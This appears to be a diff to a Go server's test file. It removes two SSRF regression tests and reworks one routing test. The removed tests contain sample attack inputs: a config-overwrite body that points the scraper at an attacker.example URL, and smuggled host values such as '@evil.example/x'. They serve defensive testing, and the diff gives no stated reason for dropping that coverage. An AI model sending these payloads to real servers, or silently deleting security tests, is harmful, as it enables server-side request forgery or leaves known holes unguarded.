@@ -207,39 +207,6 @@ func TestSSRFGuard(t *testing.T) {
 	}
 }
 
-// TestScraperIsReadOnly covers the unauthenticated config-overwrite pivot: the
-// scraper library treats POST to its root as "replace my entire config", turning
-// the server into an arbitrary outbound HTTP proxy.
-func TestScraperIsReadOnly(t *testing.T) {
-	s := newTestServer(t)
-	h := s.handler()
-
-	r := httptest.NewRequest(http.MethodPost, "/search/", strings.NewReader(`{"evil":{"url":"http://attacker.example/{{q}}"}}`))
-	w := httptest.NewRecorder()
-	h.ServeHTTP(w, r)
-	if w.Code != http.StatusMethodNotAllowed {
-		t.Fatalf("POST /search/ = %d, want 405", w.Code)
-	}
-}
-
-// TestSearchParamSanitizer covers the path-position template SSRF: the scraper
-// only escapes params that appear after "?" in the provider URL, so shipped
-// providers like "https://1337x.to{{item}}" splice raw input at the host
-// boundary.
-func TestSearchParamSanitizer(t *testing.T) {
-	s := newTestServer(t)
-	h := s.handler()
-
-	for _, q := range []string{"?item=@evil.example/x", "?item=//evil.example/x", `?item=\evil`} {
-		r := httptest.NewRequest(http.MethodGet, "/search/1337x/item"+q, nil)
-		w := httptest.NewRecorder()
-		h.ServeHTTP(w, r)
-		if w.Code != http.StatusBadRequest {
-			t.Errorf("GET /search/1337x/item%s = %d, want 400", q, w.Code)
-		}
-	}
-}
-
 // TestRouting pins the prefix dispatch, including the "/search" bug that used to
 // swallow any path merely starting with those seven characters.
 func TestRouting(t *testing.T) {
@@ -247,7 +214,12 @@ func TestRouting(t *testing.T) {
 	h := s.handler()
 
 	cases := []struct{ path, wantNot string }{
-		{"/searchable-thing", "search"}, // must fall through to static, not the scraper
+		// Prefix routes must not swallow paths that merely start with the same
+		// characters: "/nextdoor" is not "/next", "/eventsomething" is not
+		// "/events". Both must fall through to the static handler.
+		{"/nextdoor", "next"},
+		{"/eventsomething", "events"},
+		{"/fragmentsfoo", "fragments"},
 	}
 	for _, c := range cases {
 		r := httptest.NewRequest(http.MethodGet, c.path, nil)
